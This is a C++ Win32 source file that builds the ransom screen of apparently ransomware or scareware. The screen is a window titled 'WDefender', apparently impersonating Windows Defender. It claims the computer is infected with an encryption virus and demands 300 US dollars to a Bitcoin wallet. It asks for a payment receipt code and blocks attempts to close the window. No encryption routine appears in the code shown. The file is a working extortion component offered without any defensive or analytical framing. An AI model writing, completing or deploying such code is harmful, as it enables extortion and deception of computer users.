#pragma comment(linker,"\"/manifestdependency:type='win32' \
name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \
processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
#pragma once

#include <Windows.h>
#include "resource.h"

class OutWindow {
	MSG msg{};
	HWND hwnd{};
	WNDCLASSEX wc{ sizeof(WNDCLASSEX) };
public:
	int WinWindows(HINSTANCE hInstance, HINSTANCE, PWSTR szCmdLine, int nCmdShow);
	OutWindow();
	~OutWindow();
};

int  OutWindow::WinWindows(HINSTANCE hInstance, HINSTANCE, PWSTR szCmdLine, int nCmdShow) {
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hbrBackground = reinterpret_cast<HBRUSH>(GetStockObject(BLACK_BRUSH));
	wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
	wc.hIcon = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(MAIN_ICON));
	wc.hIconSm = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(MAIN_ICON));
	wc.hInstance = hInstance;
	wc.lpfnWndProc = [](HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)->LRESULT {
		HDC hDC;
		PAINTSTRUCT ps;
		HFONT oldFont, newFont;
		switch (uMsg) {
		case WM_CREATE: 
		{
			HWND hButton = CreateWindow(
				"BUTTON",
				"Submit Code",
				WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
				450 , 500, 150, 100, hwnd, nullptr, nullptr, nullptr);

			HWND hEdit = CreateWindow(
				"EDIT", NULL,
				WS_EX_CLIENTEDGE | WS_BORDER | WS_CHILD | WS_VISIBLE,
				620, 525, 500, 50, hwnd, nullptr, nullptr, nullptr);

		}
		return 0;
		case WM_PAINT:
		{
			hDC = BeginPaint(hwnd, &ps);
			SetBkColor(hDC, RGB(0, 0, 0));
			SetTextColor(hDC, RGB(255, 0, 0));
			newFont = CreateFont(100, 50, 0, 0, 700, FALSE, FALSE, 0, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
				DEFAULT_PITCH | FF_DONTCARE, ("Arial"));
			oldFont = (HFONT)SelectObject(hDC, newFont);
			TextOut(hDC, 525, 100, "WARNING", strlen("WARNING"));
			SelectObject(hDC, oldFont);
			
			SetBkColor(hDC, RGB(0, 0, 0));
			SetTextColor(hDC, RGB(0, 100, 0));
			newFont = CreateFont(40, 15, 0, 0, 500, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
				DEFAULT_PITCH | FF_DONTCARE, ("Arial"));
			oldFont = (HFONT)SelectObject(hDC, newFont);
			TextOut(hDC, 340, 240, "Your computer has been infected with an encryption virus", strlen("Your computer has been infected with an encryption virus"));
			SelectObject(hDC, oldFont);

			SetBkColor(hDC, RGB(0, 0, 0));
			SetTextColor(hDC, RGB(0, 150, 0));
			newFont = CreateFont(40, 15, 0, 0, 500, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
				DEFAULT_PITCH | FF_DONTCARE, ("Arial"));
			oldFont = (HFONT)SelectObject(hDC, newFont);
			TextOut(hDC, 260, 285, "All actions are blocked until the full encryption of your personal computer", strlen("All actions are blocked until the full encryption of your personal computer."));
			SelectObject(hDC, oldFont);

			SetBkColor(hDC, RGB(0, 0, 0));
			SetTextColor(hDC, RGB(0, 255, 0));
			newFont = CreateFont(40, 15, 0, 0, 500, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
				DEFAULT_PITCH | FF_DONTCARE, ("Arial"));
			oldFont = (HFONT)SelectObject(hDC, newFont);
			TextOut(hDC, 340, 330, "To unlock your device, send 300 us dollars to BTC - wallet:", strlen("To unlock your device, send money to BTC - wallet:"));
			SelectObject(hDC, oldFont);

			SetBkColor(hDC, RGB(0, 0, 150));
			SetTextColor(hDC, RGB(0, 255, 0));
			newFont = CreateFont(55, 25, 0, 0, 900, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
				DEFAULT_PITCH | FF_DONTCARE, ("Arial"));
			oldFont = (HFONT)SelectObject(hDC, newFont);
			TextOut(hDC, 450, 390, "126FF2829A29D393E0000", strlen("126FF2829A29D393E0000"));
			SelectObject(hDC, oldFont);

			SetBkColor(hDC, RGB(0, 0, 0));
			SetTextColor(hDC, RGB(0, 255, 0));
			newFont = CreateFont(35, 13, 0, 0, 600, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
				DEFAULT_PITCH | FF_DONTCARE, ("Arial"));
			oldFont = (HFONT)SelectObject(hDC, newFont);
			TextOut(hDC, 450, 455, "Enter the code from the payment receipt:", strlen("Enter the code from the payment receipt:"));
			SelectObject(hDC, oldFont);

			EndPaint(hwnd, &ps);
		}
		return 0;
		case WM_SIZE:
		{
			ShowWindow(hwnd, SIZE_MAXSHOW);
		}
		return 0;
		case WM_CLOSE:
		{

		}
		return false;
		case WM_DESTROY:
		{
			PostQuitMessage(EXIT_SUCCESS);
		}
		return false;
		}
		return DefWindowProc(hwnd, uMsg, wParam, lParam);
	};
	wc.lpszClassName = "WDefenderApp";
	wc.lpszMenuName = nullptr;
	wc.style = CS_VREDRAW | CS_HREDRAW;

	if (!RegisterClassEx(&wc))
		return EXIT_FAILURE;
	hwnd = CreateWindow(wc.lpszClassName, "WDefender", WS_OVERLAPPEDWINDOW, (GetSystemMetrics(SM_CXSCREEN) - 1000) / 2, (GetSystemMetrics(SM_CYSCREEN) - 650) / 2, 1000, 650, nullptr, nullptr, wc.hInstance, nullptr);
	if (hwnd == INVALID_HANDLE_VALUE) {
		return EXIT_FAILURE;
	}

	ShowWindow(hwnd, nCmdShow);
	UpdateWindow(hwnd);

	while (GetMessage(&msg, nullptr, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return static_cast<int>(msg.wParam);
}

OutWindow::OutWindow() {

}

OutWindow::~OutWindow() {

}